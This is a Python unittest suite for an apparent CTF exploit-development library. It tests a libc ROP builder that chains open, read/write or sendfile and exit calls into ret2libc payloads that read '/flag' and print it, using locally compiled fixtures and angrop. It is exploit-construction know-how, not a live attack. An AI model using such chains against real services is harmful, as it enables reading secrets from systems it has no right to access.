from __future__ import annotations

import importlib.util
import shutil
import tempfile
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest import mock

from payloads.angrop_backend import AngropDiscoveryOptions, AngropImageSpec, prepare_angrop
from payloads.libc import LibcIdentity, LibcImage
from payloads.libc_rop import (
    InlineDataReference,
    LibcROPBuilder,
    LibcROPError,
    LibcROPStage,
    LibcROPStageKind,
    WritableArea,
)
from payloads.model import Address, Image, PayloadKind, RuntimeLayout
from payloads.pwntools_compat import ExactELFAdapter
from payloads.rop import (
    AddressExpression,
    LibcBoundAddress,
    SemanticGadget,
    UnsupportedROPError,
    bind_libc_address,
)
from payloads.target import resolve_target
from payloads.tests.test_pwntools_compat import _compile_exact_rop_fixture

_FUNCTION_ONLY_SOURCES = {
    64: r"""
.text
.globl open, read, write, sendfile, exit
.type open,@function
open: ret
.type read,@function
read: ret
.type write,@function
write: ret
.type sendfile,@function
sendfile: ret
.type exit,@function
exit: ret
""",
    32: r"""
.text
.globl open, read, write, sendfile, exit
.type open,@function
open: ret
.type read,@function
read: ret
.type write,@function
write: ret
.type sendfile,@function
sendfile: ret
.type exit,@function
exit: ret
""",
}

_ANGR_AVAILABLE = importlib.util.find_spec("angr") is not None
_ANGROP_TEST_OPTIONS = AngropDiscoveryOptions(processes=1, optimize=True)


@unittest.skipUnless(shutil.which("cc"), "a C compiler/linker is required for exact libc ROP fixtures")
class LibcROPBuilderTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        super().setUpClass()
        cls.temporary = tempfile.TemporaryDirectory(prefix="pwnc-libc-rop-builder-")
        cls.root = Path(cls.temporary.name)
        cls.libc_path = _compile_exact_rop_fixture(cls.root, 64)

    @classmethod
    def tearDownClass(cls) -> None:
        cls.temporary.cleanup()
        super().tearDownClass()

    def test_inline_path_and_sendfile_need_no_writable_buffer(self) -> None:
        builder = LibcROPBuilder.from_file(self.libc_path, b"/flag")
        opened = builder.open()
        sent = builder.sendfile(1, 3, 0x400)
        finished = builder.exit(7)
        program = builder.compose(opened, sent, finished)

        self.assertIsInstance(opened.arguments[0], InlineDataReference)
        self.assertEqual(opened.arguments[1:], (0, 0))
        self.assertEqual(sent.arguments, (1, 3, 0, 0x400))
        self.assertEqual(
            program.operations,
            (LibcROPStageKind.OPEN, LibcROPStageKind.SENDFILE, LibcROPStageKind.EXIT),
        )
        self.assertTrue(program.inline_path)
        self.assertEqual(program.path_data, b"/flag\0")
        self.assertEqual(program.external_placements, ())

        with self.assertRaisesRegex(LibcROPError, "require a writable area"):
            builder.read(3, 0x100)
        with self.assertRaisesRegex(LibcROPError, "require a writable area"):
            builder.write(1, 0x100)

    def test_composition_only_carries_path_data_referenced_by_selected_stages(self) -> None:
        inline = LibcROPBuilder.from_file(self.libc_path, b"/inline-secret")
        inline_exfil = inline.compose(inline.sendfile(1, 3, 0x100), inline.exit())

        self.assertFalse(inline_exfil.inline_path)
        self.assertEqual(inline_exfil.path_data, b"")
        self.assertEqual(inline_exfil.external_placements, ())

        external = LibcROPBuilder.from_file(
            self.libc_path,
            b"/external-secret",
            path_address=Address(0xB000, Image.MAIN, "preplaced path"),
        )
        external_exfil = external.compose(external.sendfile(1, 3, 0x100), external.exit())
        external_open = external.compose(external.open(), external.exit())

        self.assertEqual(external_exfil.path_data, b"")
        self.assertEqual(external_exfil.external_placements, ())
        self.assertEqual(external_open.path_data, b"/external-secret\0")
        self.assertEqual(external_open.external_placements, external.external_placements)

    def test_non_open_numeric_argument_cannot_select_an_external_path_placement(self) -> None:
        external = LibcROPBuilder.from_file(
            self.libc_path,
            b"/external-secret",
            path_address=0x100,
        )

        exfil = external.compose(external.sendfile(1, 3, 0x100), external.exit())

        self.assertFalse(exfil.inline_path)
        self.assertEqual(exfil.path_data, b"")
        self.assertEqual(exfil.external_placements, ())

    def test_inline_fixed_point_shares_one_synthesis_deadline(self) -> None:
        builder = LibcROPBuilder.from_file(self.libc_path, b"/deadline")
        program = builder.compose(builder.open(), builder.exit())
        observed_timeouts: list[float] = []

        class FakeSession:
            def __enter__(self):
                return self

            def __exit__(self, *_args):
                return False

            def synthesize_calls(self, _calls, *, chain_base, bad_bytes, timeout):
                del chain_base, bad_bytes
                observed_timeouts.append(timeout)
                return SimpleNamespace(data=b"A" * 16)

        with (
            mock.patch("payloads.angrop_backend.prepare_angrop", return_value=FakeSession()),
            mock.patch("payloads.libc_rop.time.monotonic", side_effect=(100.0, 101.0, 103.5)),
        ):
            lowered = program.lower_angrop(
                RuntimeLayout(libc_base=0x700000000000),
                chain_base=0x404000,
                timeout=10,
            )

        self.assertEqual(observed_timeouts, [9.0, 6.5])
        self.assertEqual(lowered.inline_path_address, 0x404010)
        self.assertEqual(lowered.inline_path_reference.image, Image.ABSOLUTE)
        self.assertEqual(lowered.inline_path_reference.resolve(), 0x404010)

        for invalid_timeout in (float("nan"), float("inf"), float("-inf")):
            with self.subTest(timeout=invalid_timeout), self.assertRaisesRegex(ValueError, "finite"):
                program.lower_angrop(
                    RuntimeLayout(libc_base=0x700000000000),
                    chain_base=0x404000,
                    timeout=invalid_timeout,
                )

    def test_inline_bad_bytes_search_harmless_padding_for_an_encodable_pointer(self) -> None:
        builder = LibcROPBuilder.from_file(self.libc_path, b"/safe-path")
        program = builder.compose(builder.open(), builder.exit())
        observed_path_pointers: list[int] = []

        class FakeSession:
            def __enter__(self):
                return self

            def __exit__(self, *_args):
                return False

            def synthesize_calls(self, calls, *, chain_base, bad_bytes, timeout):
                del chain_base, timeout
                if bad_bytes:
                    observed_path_pointers.append(calls[0].arguments[0])
                return SimpleNamespace(data=b"A" * 16)

        chain_base = 0x400FFA
        with mock.patch("payloads.angrop_backend.prepare_angrop", return_value=FakeSession()):
            lowered = program.lower_angrop(
                RuntimeLayout(libc_base=0x700000000000),
                chain_base=chain_base,
                bad_bytes=(0x0A,),
            )

        self.assertEqual(lowered.inline_path_offset, 24)
        self.assertEqual(observed_path_pointers, [chain_base + 24])
        self.assertNotIn(0x0A, lowered.data)

        with self.assertRaisesRegex(LibcROPError, "inline path data"):
            program.lower_angrop(
                RuntimeLayout(libc_base=0x700000000000),
                chain_base=0x404000,
                bad_bytes=(0,),
            )

    def test_standalone_open_can_return_to_an_explicit_angrop_continuation(self) -> None:
        builder = LibcROPBuilder.from_file(
            self.libc_path,
            b"/flag",
            path_address=Address(0x2000, Image.MAIN, "preplaced path"),
        )
        program = builder.compose(builder.open())
        layout = RuntimeLayout(libc_base=0x700000000000, main_base=0x400000)
        continuation = Address(0x1234, Image.MAIN, "challenge continuation")
        observed_calls = []

        class FakeSession:
            def __enter__(self):
                return self

            def __exit__(self, *_args):
                return False

            def synthesize_calls(self, calls, **_kwargs):
                observed_calls.extend(calls)
                return SimpleNamespace(data=b"A" * 16)

        direct_calls = program.angrop_calls(layout, None, continuation=continuation)
        self.assertEqual([call.needs_return for call in direct_calls], [True, False])
        self.assertEqual(direct_calls[0].arguments[0], 0x402000)
        self.assertEqual(direct_calls[1].function, 0x401234)
        self.assertEqual(direct_calls[1].name, "continuation")

        with mock.patch("payloads.angrop_backend.prepare_angrop", return_value=FakeSession()):
            program.lower_angrop(layout, chain_base=0x404000, continuation=continuation)
        self.assertEqual(observed_calls, list(direct_calls))

        exited = builder.compose(builder.exit())
        with self.assertRaisesRegex(LibcROPError, "exit stage cannot return"):
            exited.lower_angrop(layout, chain_base=0x404000, continuation=continuation)

    def test_writable_area_places_path_then_exposes_shared_read_write_buffer(self) -> None:
        area = WritableArea(Address(0x9000, Image.MAIN, "fixture scratch"), 0x1000)
        builder = LibcROPBuilder.from_file(self.libc_path, "/tmp/flag", writable_area=area)
        opened = builder.open()
        read = builder.read(3, 0x180, buffer_offset=0x20)
        write = builder.write(1, 0x180, buffer_offset=0x20)
        program = builder.compose([opened, read, write, builder.exit()])
        layout = RuntimeLayout(main_base=0x400000)

        reservation = 16  # len(b"/tmp/flag\0") rounded to an AMD64 word
        expected_buffer = 0x400000 + 0x9000 + reservation + 0x20
        self.assertEqual(program.external_placements[0].data, b"/tmp/flag\0")
        self.assertEqual(program.external_placements[0].resolved_address(layout), 0x409000)
        self.assertEqual(
            read.arguments,
            (
                3,
                AddressExpression(
                    Address(0x9000, Image.MAIN, "fixture scratch"),
                    reservation + 0x20,
                ),
                0x180,
            ),
        )
        self.assertEqual(write.arguments, (1, read.arguments[1], 0x180))
        self.assertEqual(read.arguments[1].resolve(layout), expected_buffer)
        self.assertFalse(program.inline_path)

    def test_explicit_separate_path_address_does_not_consume_buffer_prefix(self) -> None:
        area = Address(0xA000, Image.MAIN, "data buffer")
        path = Address(0xB000, Image.MAIN, "preplaced path")
        builder = LibcROPBuilder.from_file(
            self.libc_path,
            b"/secret",
            writable_area=area,
            writable_size=0x100,
            path_address=path,
        )
        read = builder.read(3, 0x40)

        self.assertEqual(builder.open().arguments[0], path)
        self.assertEqual(read.arguments[1], area)
        self.assertEqual(builder.external_placements[0].address, path)

    def test_writable_bounds_and_input_validation_are_strict(self) -> None:
        builder = LibcROPBuilder.from_file(
            self.libc_path,
            b"/f",
            writable_area=0x601000,
            writable_size=0x20,
        )
        with self.assertRaisesRegex(LibcROPError, "exceeds"):
            builder.read(3, 0x20)
        with self.assertRaises(ValueError):
            builder.sendfile(1, 3, 0)
        with self.assertRaises(ValueError):
            builder.read(-1, 1)
        with self.assertRaises(ValueError):
            LibcROPBuilder.from_file(self.libc_path, b"bad\0path")
        with self.assertRaises(ValueError):
            LibcROPBuilder.from_file(self.libc_path, b"")
        with self.assertRaises(ValueError):
            LibcROPBuilder.from_file(self.libc_path, b"/f", writable_size=0x100)
        with self.assertRaisesRegex(LibcROPError, "aligned path reservation"):
            LibcROPBuilder.from_file(
                self.libc_path,
                b"/flag",
                writable_area=0x601000,
                writable_size=4,
            )

    def test_composer_rejects_a_stage_from_another_exact_artifact(self) -> None:
        other_path = _compile_exact_rop_fixture(self.root, 32)
        first = LibcROPBuilder.from_file(self.libc_path, b"/first")
        other = LibcROPBuilder.from_file(other_path, b"/other")
        with self.assertRaisesRegex(LibcROPError, "different libc artifacts"):
            first.compose(first.open(), other.exit())

    def test_independent_sendfile_stage_does_not_need_the_inline_open_path(self) -> None:
        libc32 = _compile_exact_rop_fixture(self.root, 32, name="independent-sendfile")
        builder = LibcROPBuilder.from_file(libc32, b"/flag")
        program = builder.compose(builder.open(), builder.sendfile(1, 7, 0x100))

        chain = program.lower_stage(1, return_to=0x8049000)

        resolved = chain.resolved_words(RuntimeLayout(libc_base=0xF7000000))
        self.assertEqual(resolved[2:6], (1, 7, 0, 0x100))


class SemanticLibcROPStageTests(unittest.TestCase):
    @staticmethod
    def _identity(seed: bytes) -> LibcIdentity:
        return LibcIdentity.from_bytes(seed)

    def test_amd64_stage_uses_exact_bound_function_and_semantic_gadgets(self) -> None:
        target = resolve_target("x86_64")
        libc = LibcImage(
            self._identity(b"amd64 semantic libc"),
            target,
            {"open": 0x1000, "pop_rdi": 0x2000, "pop_rsi": 0x2010, "pop_rdx": 0x2020},
        )
        stage = LibcROPStage(
            libc,
            LibcROPStageKind.OPEN,
            "open",
            (InlineDataReference("path"), 0, 0),
        )
        gadgets = tuple(
            SemanticGadget(
                target,
                bind_libc_address(libc, symbol),
                2,
                {register: 0},
                1,
                f"fixture pop {register}; ret",
            )
            for register, symbol in (("rdi", "pop_rdi"), ("rsi", "pop_rsi"), ("rdx", "pop_rdx"))
        )
        path = Address(0x240, Image.STACK, "inline path")
        chain = stage.lower_semantic(
            gadgets=gadgets,
            return_to=Address(0x1234, Image.MAIN, "next stage"),
            inline_addresses={"path": path},
        )

        self.assertIs(chain.kind, PayloadKind.RET2LIBC)
        self.assertEqual(chain.target, target)
        self.assertIn(libc.identity.sha256[:12], chain.description)
        bound = [word.value for word in chain.words if isinstance(word.value, LibcBoundAddress)]
        self.assertTrue(bound)
        self.assertTrue(all(value.identity == libc.identity for value in bound))
        self.assertIn(path, [word.value for word in chain.words])

    def test_arm_stage_is_lowerable_only_with_explicit_target_gadget_semantics(self) -> None:
        target = resolve_target("arm")
        libc = LibcImage(self._identity(b"arm semantic libc"), target, {"read": 0x1000, "loader": 0x2000})
        stage = LibcROPStage(libc, LibcROPStageKind.READ, "read", (3, 0x3000, 0x80))
        gadget = SemanticGadget(
            target,
            bind_libc_address(libc, "loader"),
            5,
            {"r0": 0, "r1": 1, "r2": 2, "lr": 3},
            4,
            "ARM load r0-r2/lr/pc",
        )
        chain = stage.lower_semantic(
            gadgets=(gadget,),
            return_to=Address(0x4000, Image.MAIN, "next"),
        )

        self.assertEqual(chain.target, target)
        self.assertIn("ARM load r0-r2/lr/pc", chain.steps)

    def test_i386_cdecl_stage_needs_no_register_gadgets(self) -> None:
        target = resolve_target("x86")
        libc = LibcImage(self._identity(b"i386 semantic libc"), target, {"write": 0x1000})
        stage = LibcROPStage(libc, LibcROPStageKind.WRITE, "write", (1, 0x804C000, 0x20))
        chain = stage.lower_semantic(return_to=0x8049000)

        self.assertEqual(
            chain.resolved_words(RuntimeLayout(libc_base=0)),
            (0x1000, 0x8049000, 1, 0x804C000, 0x20),
        )

    def test_ppc64_elfv1_rejects_a_false_raw_direct_call_claim(self) -> None:
        target = resolve_target("ppc64")
        libc = LibcImage(self._identity(b"ppc64v1 semantic libc"), target, {"exit": 0x1000})
        stage = LibcROPStage(libc, LibcROPStageKind.EXIT, "exit", (0,))
        with self.assertRaises(UnsupportedROPError):
            stage.lower_semantic()

    def test_unbound_libc_relative_arguments_are_rejected(self) -> None:
        target = resolve_target("x86")
        libc = LibcImage(self._identity(b"identity binding"), target, {"write": 0x1000})
        with self.assertRaisesRegex(LibcROPError, "lacks exact LibcIdentity"):
            LibcROPStage(libc, LibcROPStageKind.WRITE, "write", (1, Address(0x2000, Image.LIBC), 0x20))


@unittest.skipUnless(shutil.which("cc"), "a C compiler/linker is required for exact libc ROP fixtures")
@unittest.skipUnless(_ANGR_AVAILABLE, "install pwnc with the 'rop' extra for automatic angrop lowering")
class AngropComposedProgramTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        super().setUpClass()
        cls.temporary = tempfile.TemporaryDirectory(prefix="pwnc-libc-rop-linked-")
        cls.root = Path(cls.temporary.name)
        cls.fixtures = {bits: _compile_exact_rop_fixture(cls.root, bits) for bits in (32, 64)}

    @classmethod
    def tearDownClass(cls) -> None:
        cls.temporary.cleanup()
        super().tearDownClass()

    def test_angrop_links_open_sendfile_exit_with_inline_path_on_both_x86_abis(self) -> None:
        configurations = {
            32: (0xF7000000, 0x804C000),
            64: (0x700000000000, 0x404000),
        }
        for bits, (libc_base, chain_base) in configurations.items():
            with self.subTest(bits=bits):
                builder = LibcROPBuilder.from_file(self.fixtures[bits], b"/flag")
                program = builder.compose(builder.open(), builder.sendfile(1, 3, 0x100), builder.exit(37))
                layout = RuntimeLayout(libc_base=libc_base)
                lowered = program.lower(
                    layout,
                    chain_base=chain_base,
                    options=_ANGROP_TEST_OPTIONS,
                )

                self.assertEqual(lowered.data[-6:], b"/flag\0")
                self.assertEqual(lowered.inline_path_address, chain_base + lowered.inline_path_offset)
                self.assertEqual(lowered.inline_path_offset % builder.target.word_size, 0)
                self.assertIn(builder.target.pack(lowered.inline_path_address), lowered.chain)
                for symbol in ("open", "sendfile", "exit"):
                    address = libc_base + builder.libc.offset(symbol)
                    self.assertIn(builder.target.pack(address), lowered.chain)

                payload = lowered.as_payload()
                self.assertIs(payload.kind, PayloadKind.RET2LIBC)
                self.assertEqual(payload.data, lowered.data)
                self.assertEqual(payload.metadata["libc_sha256"], builder.libc.identity.sha256)
                self.assertEqual(payload.metadata["operations"], ("open", "sendfile", "exit"))
                self.assertEqual(payload.metadata["rop_backend"], "angrop")
                self.assertEqual(lowered.backend_result.calls[-1].needs_return, False)
                self.assertTrue(lowered.backend_result.discovery_options.optimize)
                if bits == 32:
                    exit_address = libc_base + builder.libc.offset("exit")
                    exit_index = max(
                        index for index, word in enumerate(lowered.backend_result.words) if word == exit_address
                    )
                    self.assertEqual(lowered.backend_result.words[exit_index + 2], 37)

    def test_angrop_links_shared_buffer_orw_without_appending_path(self) -> None:
        configurations = {
            32: (0xF7000000, 0x804C000, 0x804E000),
            64: (0x700000000000, 0x404000, 0x406000),
        }
        for bits, (libc_base, chain_base, scratch) in configurations.items():
            with self.subTest(bits=bits):
                builder = LibcROPBuilder.from_file(
                    self.fixtures[bits],
                    b"/flag",
                    writable_area=scratch,
                    writable_size=0x1000,
                )
                read = builder.read(3, 0x80)
                program = builder.compose(builder.open(), read, builder.write(1, 0x80), builder.exit())
                lowered = program.lower(
                    RuntimeLayout(libc_base=libc_base),
                    chain_base=chain_base,
                    options=_ANGROP_TEST_OPTIONS,
                )

                self.assertIsNone(lowered.inline_path_offset)
                self.assertEqual(lowered.data, lowered.chain)
                self.assertEqual(program.external_placements[0].address, scratch)
                buffer = read.arguments[1]
                self.assertIsInstance(buffer, int)
                self.assertIn(builder.target.pack(buffer), lowered.chain)

    def test_prepared_session_is_reused_without_being_closed_by_high_level_lowering(self) -> None:
        libc_base = 0x700000000000
        builder = LibcROPBuilder.from_file(self.fixtures[64], b"/unused")
        first = builder.compose(builder.sendfile(1, 3, 0x40), builder.exit(31))
        second = builder.compose(builder.sendfile(1, 4, 0x80), builder.exit(32))
        image = AngropImageSpec.from_adapter(
            builder.adapter,
            load_bias=libc_base,
            name="libc",
        )

        with prepare_angrop((image,), options=_ANGROP_TEST_OPTIONS) as session:
            first_result = first.lower(
                RuntimeLayout(libc_base=libc_base),
                chain_base=0x404000,
                session=session,
            )
            second_result = second.lower(
                RuntimeLayout(libc_base=libc_base),
                chain_base=0x405000,
                session=session,
            )
            self.assertFalse(session.closed)
            self.assertEqual(len(session._analysis_cache), 1)

        self.assertTrue(session.closed)
        self.assertEqual(first_result.backend_result.images, second_result.backend_result.images)
        self.assertEqual(first_result.backend_result.calls[0].arguments[1], 3)
        self.assertEqual(second_result.backend_result.calls[0].arguments[1], 4)

    def test_angrop_can_take_missing_gadgets_from_an_exact_challenge_image_at_an_explicit_bias(self) -> None:
        configurations = {
            32: (0xF7000000, 0x56550000, 0x804C000),
            64: (0x700000000000, 0x555500000000, 0x404000),
        }
        for bits, (libc_base, challenge_bias, chain_base) in configurations.items():
            with self.subTest(bits=bits):
                function_only = _compile_exact_rop_fixture(
                    self.root,
                    bits,
                    name="function-only",
                    source=_FUNCTION_ONLY_SOURCES[bits],
                )
                supplemental_path = _compile_exact_rop_fixture(
                    self.root,
                    bits,
                    name="challenge-gadgets",
                    extra_source="\n.globl challenge_marker\nchallenge_marker: nop; ret\n",
                )
                supplemental = ExactELFAdapter.from_file(supplemental_path)
                supplemental_spec = AngropImageSpec.from_adapter(
                    supplemental,
                    load_bias=challenge_bias,
                    name="challenge-gadgets",
                )
                builder = LibcROPBuilder.from_file(
                    function_only,
                    b"/flag",
                    writable_area=0x406000 if bits == 64 else 0x804E000,
                    writable_size=0x1000,
                )
                program = builder.compose(
                    builder.open(),
                    builder.read(3, 0x40),
                    builder.write(1, 0x40),
                    builder.exit(42),
                )

                lowered = program.lower(
                    RuntimeLayout(libc_base=libc_base),
                    chain_base=chain_base,
                    extra_images=(supplemental_spec,),
                    scan_libc_gadgets=False,
                    options=_ANGROP_TEST_OPTIONS,
                )

                self.assertTrue(lowered.chain)
                synthesis = lowered.backend_result
                self.assertEqual(tuple(item.load_bias for item in synthesis.images), (libc_base, challenge_bias))
                self.assertEqual(tuple(item.scan_gadgets for item in synthesis.images), (False, True))
                call_targets = [item for item in synthesis.gadgets if item.call_target]
                selected_gadgets = [item for item in synthesis.gadgets if not item.call_target]
                self.assertTrue(call_targets)
                self.assertTrue(selected_gadgets)
                self.assertEqual({item.image_sha256 for item in call_targets}, {builder.libc.identity.sha256})
                self.assertEqual({item.image_sha256 for item in selected_gadgets}, {supplemental.identity.sha256})

    def test_materialization_requires_a_runtime_libc_base(self) -> None:
        builder = LibcROPBuilder.from_file(self.fixtures[64], b"/flag")
        program = builder.compose(builder.open(), builder.exit())
        with self.assertRaisesRegex(LibcROPError, "runtime libc base"):
            program.materialize(RuntimeLayout(), chain_base=0x404000)


if __name__ == "__main__":
    unittest.main()
